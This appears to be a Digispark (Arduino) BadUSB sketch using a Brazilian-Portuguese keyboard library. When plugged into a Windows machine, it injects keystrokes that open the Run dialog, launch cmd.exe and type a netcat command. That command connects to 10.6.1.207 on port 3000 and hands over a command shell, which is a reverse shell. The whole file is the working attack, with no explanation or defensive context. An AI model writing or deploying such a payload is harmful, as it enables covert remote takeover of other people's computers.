#include "DigiKeyboardPtBr.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(600);
  DigiKeyboardPtBr.print("cmd.exe");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("c:\\temp\\nc64.exe 10.6.1.207 3000 -e c:\\Windows\\system32\\cmd.exe");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
